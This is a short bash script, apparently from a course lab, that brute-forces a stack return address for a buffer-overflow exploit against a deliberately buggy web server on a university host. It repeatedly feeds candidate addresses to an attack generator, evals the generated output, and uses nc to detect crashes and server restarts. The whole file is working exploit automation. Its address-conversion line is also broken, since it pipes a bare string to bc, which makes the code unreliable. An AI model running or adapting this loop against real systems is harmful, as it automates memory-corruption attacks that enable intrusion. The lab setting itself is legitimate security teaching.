#!/bin/bash

curraddress="bfffffff"
bool=0

while [ "$bool" -eq 0 ]; do

	result=`./attack_generator $curraddress`
	eval $result

	echo "New while loop"

	sleep 1

	compare_string=$((nc -v cps110.cs.duke.edu 8097) 2>&1)

	if [ "$compare_string" = "Connection to cps110.cs.duke.edu 8097 port [tcp/*] succeeded!
HTTP/1.1 404 Not Found
Server: BuggyServer/1.0" ]; then

		bool=1
		echo "succeeded???"

	fi

	if [ "$compare_string" = "nc: connect to cps110.cs.duke.edu port 8097 (tcp) failed: Connection refused" ]; then
	
		echo "Segmentation fault occured due to wrong return address."	
		#sleep 5		

		while [ "$compare_string" != "Connection to cps110.cs.duke.edu 8097 port [tcp/*] succeeded!
HTTP/1.1 404 Not Found
Server: BuggyServer/1.0" ]
		do	
			echo "Still checking..."
			echo "compare_string is still: $compare_string"	
			sleep 6
			compare_string=$((nc -v cps110.cs.duke.edu 8097) 2>&1)
			
			echo "current address: $curraddress"
			echo ""

		done
		
		echo "Server is refreshed."
		operand="0x$curraddress"
		operator="0x1F4"
		nextaddress=$(($operand-$operator))

		nextaddress=$("ibase=10;obase=16;$nextaddress" | bc)

		echo "Moving onto next address: $nextaddress ."
		curraddress=$nextaddress
	fi
	

	

done

echo "Done! The address we want is 0x$curraddress ."
